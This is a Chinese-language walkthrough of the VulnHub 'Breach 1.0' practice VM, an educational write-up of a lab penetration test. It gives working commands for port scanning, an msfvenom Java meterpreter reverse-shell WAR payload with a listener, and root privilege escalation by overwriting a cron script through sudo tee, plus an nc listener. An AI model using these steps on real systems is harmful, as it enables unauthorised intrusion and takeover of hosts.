vulnhub靶场–breach1.0

前言

vulnhub是一个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。

环境准备

1.kail

网络适配器选择host-only仅主机模式

2.靶机breach1.0

下载地址

https://www.vulnhub.com/entry/breach-1,152/

根据提示：靶机的网络适配器选择仅主机模式，IP地址为192.168.110.140

3.下载之后是一个ova文件，直接导入虚拟机即可

打开靶机之后是这样的

信息搜集

在渗透测试中，信息搜集是必不可少的

首先在kail中输入ifconfig查看本地ip地址

由于我们选择的网络适配器为仅主机模式，所以和靶机是处于同一C段的，这有利于我们之后的渗透测试。接下来使用nmap扫描靶机的端口情况，执行下列命令执行端口扫描

nmap 192.168.110.140

可以看出这台靶机开放了非常多的端口，这显然有猫腻，初步判断是部署了蜜罐

蜜罐：蜜罐系统就是系统管理员放置在网络中的一个假情报，一个捕鼠器，用于发现攻击并产生预警。

流量分析

用wireshark打开刚刚下载的pcap文件，

有很多是TLSv1.2协议，内容都是加密的，无法看到内容。那我们怎么办呢？之前下载的keystore文件是不是还没用到，通过万能的百度我知道了可以用wiresharl导入密钥，配置好算法，可以解密报文，从而看到被加密的数据。接下来我们就使用keystore文件制作一个数字证书，导入到wireshark中，执行以下命令将密钥库导入到数字证书

keytool -importkeystore -srckeystore d:\keystore -destkeystore d:\tomcat.p12 -deststoretype PKCS12 -srcalias tomcat

数字证书制作成功

反弹shell

在这个界面我们看到有一个可以上传文件的地方，由此想到可以利用msf生成一个木马文件进行上传，执行以下命令生成木马文件

msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.110.128 lport=9999 -f war -o shell.war

开启另一个终端，输入msfconsole，开启监听

use exploit/multi/handler

设置payload

set payload java/meterpreter/reverse_tcp

设置lhost和lport

set lhost 192.168.110.128
set lport 9999

然后在网站上上传war包

根据第5和第6条命令，进入tidyup.sh，

该脚本每3分钟清理 /var/lib/tomcat6/webapps目录里的文件，作为一种防入侵的保护措施

tidyup.sh文件只有root可写，而能够以root权限运行tee命令，那么用tee命令写tidyup.sh，将反弹shell命令写入1.txt

cat 1.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

再打开一个终端，开启监听

nc -lvp 7777
